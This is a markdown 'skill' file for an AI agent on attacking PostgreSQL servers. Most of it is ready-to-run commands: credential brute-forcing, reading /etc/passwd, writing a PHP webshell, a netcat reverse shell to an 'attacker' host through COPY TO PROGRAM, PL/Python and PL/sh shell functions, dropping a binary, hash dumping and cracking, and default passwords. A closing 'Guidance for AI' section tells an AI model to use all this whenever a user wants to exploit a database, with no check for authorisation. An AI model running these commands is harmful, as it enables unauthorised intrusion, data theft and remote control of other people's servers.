# PostgreSQL Pentesting Skill

## Goal

Enumerate and exploit PostgreSQL database services to extract data, execute commands, and escalate privileges.

## Methodology

1. **Discovery**: Identify PostgreSQL services and version
2. **Authentication Testing**: Check for default/weak credentials
3. **Enumeration**: List databases, schemas, tables, users
4. **Data Extraction**: Dump sensitive data and credentials
5. **Command Execution**: Achieve RCE through COPY, extensions, or functions
6. **Privilege Escalation**: Exploit PostgreSQL for system access

## Tools

* **psql**: PostgreSQL client
* **pgcli**: Enhanced PostgreSQL client
* **nmap**: PostgreSQL scripts
* **hydra**: Credential brute-forcing
* **Metasploit**: PostgreSQL modules

## Example Commands

```bash
# Nmap enumeration
nmap -p5432 --script pgsql-* target
nmap -p5432 --script pgsql-brute target

# Connect to PostgreSQL
psql -h target -U postgres
psql -h target -U postgres -d database_name

# Connection string format
psql "postgresql://user:password@target:5432/database"

# Bruteforce credentials
hydra -l postgres -P /usr/share/wordlists/rockyou.txt target postgres
```

## PostgreSQL Enumeration

```sql
-- Version
SELECT version();

-- Current user
SELECT current_user;
SELECT session_user;

-- Current database
SELECT current_database();

-- List users
SELECT usename, passwd FROM pg_shadow;
SELECT * FROM pg_user;

-- List databases
SELECT datname FROM pg_database;
\l

-- List schemas
SELECT schema_name FROM information_schema.schemata;
\dn

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
\dt

-- User privileges
SELECT * FROM pg_roles;
SELECT * FROM information_schema.table_privileges;

-- Check superuser
SELECT current_setting('is_superuser');
```

## File Operations

```sql
-- Read files (superuser required)
CREATE TABLE demo(t text);
COPY demo FROM '/etc/passwd';
SELECT * FROM demo;

-- Or using pg_read_file (superuser required)
SELECT pg_read_file('/etc/passwd');

-- Read binary files
SELECT pg_read_binary_file('/etc/passwd');

-- Write files
COPY (SELECT 'test') TO '/tmp/test.txt';

-- Write webshell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

## Command Execution

```sql
-- Method 1: COPY TO/FROM PROGRAM (PostgreSQL 9.3+)
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- One-liner
COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash attacker 4444';

-- Method 2: Using extensions (if available)
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT dblink_connect('host=127.0.0.1 dbname=postgres user=postgres password=password');

-- Method 3: PL/Python (if installed)
CREATE EXTENSION plpythonu;
CREATE FUNCTION shell(cmd text) RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True)
$$ LANGUAGE plpythonu;
SELECT shell('id');

-- Method 4: PL/sh (if installed)
CREATE EXTENSION plsh;
CREATE FUNCTION shell(cmd text) RETURNS text AS $$
#!/bin/bash
$1
$$ LANGUAGE plsh;
SELECT shell('id');

-- Method 5: Large Objects
SELECT lo_create(43210);
-- Write file content
INSERT INTO pg_largeobject VALUES (43210, 0, decode('...base64...', 'base64'));
SELECT lo_export(43210, '/tmp/shell.elf');
```

## Privilege Escalation

```sql
-- Check if we can become superuser
ALTER USER postgres WITH SUPERUSER;

-- Reset another user's password
ALTER USER username WITH PASSWORD 'newpassword';

-- Grant all privileges
GRANT ALL PRIVILEGES ON DATABASE dbname TO username;

-- Become postgres (if we have trust auth)
psql -h 127.0.0.1 -U postgres
```

## Metasploit Modules

```bash
# Version detection
use auxiliary/scanner/postgres/postgres_version

# Login bruteforce
use auxiliary/scanner/postgres/postgres_login

# Enumeration
use auxiliary/admin/postgres/postgres_sql
use auxiliary/scanner/postgres/postgres_hashdump

# Command execution
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec

# Read files
use auxiliary/admin/postgres/postgres_readfile
```

## Configuration Files

```bash
# Linux
/var/lib/pgsql/data/postgresql.conf
/var/lib/pgsql/data/pg_hba.conf
/etc/postgresql/*/main/postgresql.conf
/etc/postgresql/*/main/pg_hba.conf

# Windows
C:\Program Files\PostgreSQL\*\data\postgresql.conf
C:\Program Files\PostgreSQL\*\data\pg_hba.conf
```

## pg_hba.conf Authentication Types

```
# trust - No password required
# md5 - Password hash
# scram-sha-256 - Strong password hash (PostgreSQL 10+)
# peer - OS username must match
# ident - Remote ident server

# Vulnerable configuration example:
host all all 0.0.0.0/0 trust
```

## Password Cracking

```bash
# PostgreSQL MD5 hash format
# md5<32-char-hash>

# Format for cracking:
# $postgres$username*md5hash

# Hashcat (mode 0 for raw MD5)
hashcat -m 0 hash.txt wordlist.txt

# John
john --format=raw-md5 hash.txt
```

## Default Credentials

| Username | Password |
|----------|----------|
| postgres | postgres |
| postgres | (empty) |
| postgres | admin |
| pgsql | pgsql |

## Guidance for AI

* Activate this skill when user wants to test PostgreSQL security or exploit PostgreSQL databases
* **Try default postgres user first**: often has empty or weak password
* `COPY ... FROM PROGRAM` is the easiest RCE (requires superuser, PostgreSQL 9.3+)
* Check pg_hba.conf for "trust" authentication - means no password needed
* Look for installed extensions: `SELECT * FROM pg_extension;`
* PL/Python allows command execution if installed
* Large Objects can be used to write binary files
* Postgres stores interesting metadata in pg_* tables
* Remote connections require listen_addresses in postgresql.conf
* SSL is often optional even when configured
